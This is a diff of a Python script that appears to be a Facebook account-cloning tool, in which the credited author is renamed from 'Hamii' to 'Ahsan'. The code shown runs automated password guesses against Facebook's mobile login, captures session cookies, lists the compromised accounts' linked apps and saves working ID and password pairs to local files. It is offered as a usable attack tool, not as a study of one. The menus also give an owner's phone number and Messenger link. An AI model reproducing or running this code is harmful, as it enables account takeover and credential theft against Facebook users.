@@ -1,6 +1,6 @@
-#created by hamii
+#created by Ahsan
 #team name hbf
-#tottaly written by hamid Khawaja
+#tottaly written by Ahsan Riaz
 #!/usr/bin/python3 
 #---------------------[IMPORT]---------------------#
 from bs4 import BeautifulSoup as sop
@@ -29,7 +29,7 @@ class jalan:
             sys.stdout.write(e)
             sys.stdout.flush()
             time.sleep(0.0001)
-sys.stdout.write('\x1b[1;35m\x1b]2; HAMII \x07')
+sys.stdout.write('\x1b[1;35m\x1b]2; Ahsan \x07')
 ###----------[ IMPORT LIBRARY ]---------- ###
 import requests
 import bs4
@@ -60,7 +60,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python Hamii.py')
+    os.system('python Ahsan.py')
 from bs4 import BeautifulSoup
 from datetime import date
 from datetime import datetime
@@ -97,7 +97,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-hamii2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
+Ahsan2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
 import random
 cokbrut=[]
 ses=requests.Session()
@@ -269,7 +269,7 @@ twf = []
 
 
 
-def hamiiT():
+def AhsanT():
     now = datetime.now()
     hours = now.hour
     if 4 <= hours < 12:timenow = "Good Morning"
@@ -293,22 +293,14 @@ else:
     tag = "AM"
 
 logo ="""     \033[1;37m____ \033[1;32m             ______     _______   \033[1;37m____   
-    \033[1;37m(  __)\033[1;32m |\     /|  (  ___ \   (  ____ \ \033[1;37m(__  )  
-    \033[1;37m| (\033[1;32m    | )   ( |  | (   ) )  | (    \/\033[1;37m    ) | 
-    \033[1;37m| |\033[1;32m    | (___) |  | (__/ /   | (__\033[1;37m        | |  
-    \033[1;37m| |\033[1;32m    |  ___  |  |  __ (    |  __)\033[1;37m       | |  
-    \033[1;37m| |\033[1;32m    | (   ) |  | (  \ \   | (\033[1;37m          | |  
-    \033[1;37m| (__\033[1;32m  | )   ( |  | )___) )  | )\033[1;37m        __) |  
-    \033[1;37m(____)\033[1;32m |/     \|  |/ \___/   |/\033[1;37m        (____)
-\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36m𝐇𝐁𝐅✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
-\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mMUHAMMAD HAMID KHAWAJA          \033[1;31m│
-\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mMUHAMMAD HAMID KHAWAJA          \033[1;31m│
-\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m Hamii-king-06                  \033[1;31m │
-\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mHAMII WORLD                  \033[1;31m   │
-\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m1.2                          \033[1;31m   │
-\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mFACEBOOK TRICKS AND HELPING ZONE\033[1;37m {\033[1;36mHBF\033[1;37m} \033[1;31m│
-\033[1;37m╚\033[1;36mⒽⒷⒻ\033[1;37m══════\033[41m\033[1;37m[ 𓆩𝐇𝐈𝐋𝐀𝐑𝐈𝐎𝐔𝐒𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪  𓆩𝐅𝐎𝐑𝐂𝐄𓆪 ]\x1b[0m══════\033[1;36mⒽⒷⒻ\033[1;37m╝
-
+                                  ____  __ __  _____  ____  ____  
+                             /    ||  |  |/ ___/ /    ||    \ 
+                            |  o  ||  |  (   \_ |  o  ||  _  |
+                            |     ||  _  |\__  ||     ||  |  |
+                            |  _  ||  |  |/  \ ||  _  ||  |  |
+                            |  |  ||  |  |\    ||  |  ||  |  |
+                            |__|__||__|__| \___||__|__||__|__|
+                                  
 \033[1;31m======================================================"""
 
 
@@ -324,7 +316,7 @@ xxxx = str(len(ugen))
 jalan(" \x1b[38;5;196mTOTAL USER AGENTS : " + xxxx)
 print(" HEY USER GIVE ME SOME YOUR INFORMATION ❤")
 print("")
-print(f"{BLUE} PUT YOUR NAME LIKE Hamid, Hassan, Muskan, Ayesha ")
+print(f"{BLUE} PUT YOUR NAME LIKE Ahsan, Hassan, Muskan, Ayesha ")
 NameX =input('\x1b[38;5;46m [•] \x1b[38;5;46mWHAT IS YOUR NAME : ')
 
 def linex():
@@ -350,7 +342,7 @@ def cek_apk(session,coki):
         print(f'\r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-            #created by hbf team(owner) Hamii
+            #created by hbf team(owner) Ahsan
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
@@ -386,7 +378,7 @@ def XYZ():
     clear()
     print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
     print(f'{BLUE}══════════════════════════════════════════════════')
-    print(f"\t      {WHITE}[{EXTRA} {hamiiT()} {WHITE}]")
+    print(f"\t      {WHITE}[{EXTRA} {AhsanT()} {WHITE}]")
     print(f" {GREEN}PREMIUM USER          {WHITE}: {GREEN}Mr {ORANGE} {NameX}")
     print(f"{BLUE}══════════════════════════════════════════════════")
     print(f"{RED}[01] {WHITE}PAK RANDOM CLONE ")
@@ -394,16 +386,16 @@ def XYZ():
     print(f"{RED}[03] {WHITE}OWNER WHATSAPP")
     print(f"{RED}[00] {WHITE}EXIT PROGRAM ")
     print(f"\033[1;91m====================================================")
-    hamii = input("[√] CHOOSE : ")
-    if hamii in ["1","01"]:
+    Ahsan = input("[√] CHOOSE : ")
+    if Ahsan in ["1","01"]:
         passx()
-    elif hamii in ["2","02"]:
+    elif Ahsan in ["2","02"]:
         os.system("xdg-open https://m.me/H4M11.YOUR.DAD")
         XYZ()
-    elif hamii in ["3","03"]:
+    elif Ahsan in ["3","03"]:
         os.system("xdg-open https://wa.me/+923155912839")
         XYZ()
-    elif hamii in ["0","00"]:
+    elif Ahsan in ["0","00"]:
        exit()
     else:
         print('\033[1;31mINCORECT OPTION !!');XYZ()
@@ -420,14 +412,14 @@ def passx():
     print(f"{RED}[02] {WHITE}AUTO PASS 7 AND 11 DIGITS  {GREEN}[FAST]")
     print(f"{RED}[03] {WHITE}AUTO ULTIMATE PASS         {GREEN}[NORMAL]")
     print(f"\033[1;91m====================================================")
-    hamii = input("[√] CHOOSE : ")
-    if hamii in ["1","01"]:
+    Ahsan = input("[√] CHOOSE : ")
+    if Ahsan in ["1","01"]:
         pass1()
-    elif hamii in ["2","02"]:
+    elif Ahsan in ["2","02"]:
         pass2()
-    elif hamii in ["3","03"]:
+    elif Ahsan in ["3","03"]:
         Ulti()
-    elif hamii in ["4","04"]:
+    elif Ahsan in ["4","04"]:
         pass3()
     else:
         print('\033[1;31mINCORECT OPTION !!');XYZ()
@@ -475,7 +467,7 @@ def pass1():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HAMII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Ahsan-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Ahsan-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -526,7 +518,7 @@ def pass2():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HAMII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Ahsan-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Ahsan-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -573,7 +565,7 @@ def Ulti():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HAMII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Ahsan-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Ahsan-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -622,7 +614,7 @@ def pass3():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HAMII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Ahsan-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Ahsan-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -638,7 +630,7 @@ def freeq(uid,pwx,tl):
             bi = random.choice([A])
             session = requests.Session()
             ua = random.choice(ugen)
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://x.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -651,57 +643,51 @@ def freeq(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {
     'authority': 'mbasic.facebook.com',
-    'method':'GET',
-    'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
-    'scheme':'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://mbasic.facebook.com',
-    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
     'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
-                #os.system("play-audio HAMII_OK.mp3")
+                #os.system("play-audio Ahsan_OK.mp3")
                 print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                 cek_apk(session,coki)
-                open('/sdcard/HAMII-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/Ahsan-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     coki1 = coki.split("1000")[1]
                     uid = "1000"+coki1[0:11]
-                    #os.system("play-audio HAMII_2F.mp3")
+                    #os.system("play-audio Ahsan_2F.mp3")
                     print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
-                    open('/sdcard/HAMII-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    open('/sdcard/Ahsan-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     coki1 = coki.split("1000")[1]
                     uid = "1000"+coki1[0:11]
-                  #  os.system("play-audio HAMII_CP.mp3")
+                  #  os.system("play-audio Ahsan_CP.mp3")
                     print(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
-                    open('/sdcard/HAMII-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    open('/sdcard/Ahsan-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[HAMII 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[Ahsan 🔥] [%s] \33[1;97m[OK:%s{Ahsan2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
     except:
         pass
